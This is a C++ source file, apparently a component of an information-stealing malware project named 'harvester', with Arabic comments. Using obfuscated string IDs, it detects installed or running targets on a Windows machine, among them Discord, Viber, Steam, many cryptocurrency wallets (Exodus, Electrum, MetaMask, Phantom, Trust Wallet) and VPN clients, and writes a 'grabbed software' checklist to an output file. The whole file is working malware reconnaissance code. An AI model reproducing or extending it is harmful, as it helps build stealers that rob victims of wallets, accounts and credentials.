// harvester/collectors/app_detector.cpp
#include "app_detector.h"
#include "../crypto/obfuscation.h"
#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <fstream>
#include <algorithm>

// قائمة المعرفات (معرفات السلاسل المشفرة) للتطبيقات المستهدفة
std::vector<int> GetTargetAppIDs() {
    return {
        STR_DISCORD,
        STR_VIBER,
        STR_TLAUNCHER,
        STR_STEAM,
        STR_BLUESTACKS,
        STR_EXODUS,
        STR_ATOMIC,
        STR_ELECTRUM,
        STR_GUARDA,
        STR_COINOMI,
        STR_METAMASK,
        STR_COINBASE_WALLET,
        STR_BINANCE_WALLET,
        STR_PHANTOM,
        STR_RONIN,
        STR_TRONLINK,
        STR_TRUST_WALLET,
        STR_OPENVPN,
        STR_NORDVPN,
        STR_PROTONVPN
    };
}

// دالة مساعدة للبحث عن مجلد تثبيت تطبيق (فحص عدة مسارات شائعة)
static std::string FindAppInstallPath(const std::string& appName, const std::vector<std::string>& possiblePaths) {
    for (const auto& basePath : possiblePaths) {
        std::string fullPath = basePath + "\\" + appName;
        DWORD attrs = GetFileAttributesA(fullPath.c_str());
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            return fullPath;
        }
    }
    return "";
}

// التحقق من وجود عملية جارية باسم معين
static bool IsProcessRunning(const std::string& exeName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exeName.c_str()) == 0) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return false;
}

// الكشف عن التطبيقات
std::vector<DetectedApp> DetectTargetedApps() {
    std::vector<DetectedApp> results;
    auto appIDs = GetTargetAppIDs();
    
    // المسارات الأساسية للبحث
    char programFiles[MAX_PATH];
    char programFilesX86[MAX_PATH];
    char appData[MAX_PATH];
    char localAppData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, 0, programFiles);
    SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, programFilesX86);
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
    
    std::vector<std::string> basePaths = { programFiles, programFilesX86, appData, localAppData };
    
    for (int id : appIDs) {
        std::string appName = GetObfuscatedString(id);
        DetectedApp app;
        app.name = appName;
        app.found = false;
        
        // مسارات خاصة لبعض التطبيقات
        if (id == STR_DISCORD) {
            // Discord عادة في LocalAppData
            std::string discordPath = std::string(localAppData) + "\\Discord";
            if (GetFileAttributesA(discordPath.c_str()) != INVALID_FILE_ATTRIBUTES)
                app.found = true;
            else if (IsProcessRunning("Discord.exe"))
                app.found = true;
        }
        else if (id == STR_VIBER) {
            std::string viberPath = std::string(appData) + "\\ViberPC";
            if (GetFileAttributesA(viberPath.c_str()) != INVALID_FILE_ATTRIBUTES)
                app.found = true;
            else if (IsProcessRunning("Viber.exe"))
                app.found = true;
        }
        else if (id == STR_TLAUNCHER) {
            std::string tlauncherPath = std::string(appData) + "\\.tlauncher";
            if (GetFileAttributesA(tlauncherPath.c_str()) != INVALID_FILE_ATTRIBUTES)
                app.found = true;
        }
        else if (id == STR_STEAM) {
            std::string steamPath = std::string(programFilesX86) + "\\Steam";
            if (GetFileAttributesA(steamPath.c_str()) != INVALID_FILE_ATTRIBUTES)
                app.found = true;
            else if (IsProcessRunning("Steam.exe"))
                app.found = true;
        }
        else if (id == STR_BLUESTACKS) {
            std::string bsPath = std::string(programFiles) + "\\BlueStacks";
            if (GetFileAttributesA(bsPath.c_str()) != INVALID_FILE_ATTRIBUTES)
                app.found = true;
            else if (IsProcessRunning("HD-Player.exe"))
                app.found = true;
        }
        else if (id == STR_EXODUS || id == STR_ATOMIC || id == STR_ELECTRUM || id == STR_GUARDA || id == STR_COINOMI) {
            // محافظ سطح المكتب غالباً في AppData أو Program Files
            std::string walletPath = std::string(appData) + "\\" + appName;
            if (GetFileAttributesA(walletPath.c_str()) != INVALID_FILE_ATTRIBUTES)
                app.found = true;
            else {
                // البحث في Program Files
                walletPath = std::string(programFiles) + "\\" + appName;
                if (GetFileAttributesA(walletPath.c_str()) != INVALID_FILE_ATTRIBUTES)
                    app.found = true;
            }
        }
        else if (id >= STR_METAMASK && id <= STR_TRUST_WALLET) {
            // امتدادات المتصفح – سنكتشفها لاحقاً من ملفات المتصفحات (Extensions)
            // نتركها كـ false حالياً، يمكن تحديث لاحقاً
            app.found = false;
        }
        else if (id == STR_OPENVPN || id == STR_NORDVPN || id == STR_PROTONVPN) {
            std::string vpnPath = std::string(programFiles) + "\\" + appName;
            if (GetFileAttributesA(vpnPath.c_str()) != INVALID_FILE_ATTRIBUTES)
                app.found = true;
            else if (IsProcessRunning(appName + ".exe"))
                app.found = true;
        }
        else {
            // بحث عام في المسارات
            for (const auto& base : basePaths) {
                std::string testPath = base + "\\" + appName;
                if (GetFileAttributesA(testPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                    app.found = true;
                    break;
                }
            }
            // أيضاً نتحقق من العملية
            if (!app.found && IsProcessRunning(appName + ".exe"))
                app.found = true;
        }
        
        results.push_back(app);
    }
    return results;
}

void SaveDetectedAppsToFile(const std::vector<DetectedApp>& apps, const std::string& outputDir) {
    std::string filePath = outputDir + "\\" + GetObfuscatedString(STR_DETECTED_APPS); // "detected_apps.txt"
    std::ofstream out(filePath);
    if (!out.is_open()) return;
    
    out << GetObfuscatedString(STR_GRABBED_SOFTWARE) << ":" << std::endl;
    for (const auto& app : apps) {
        out << (app.found ? "[x] " : "[ ] ") << app.name << std::endl;
    }
    out.close();
}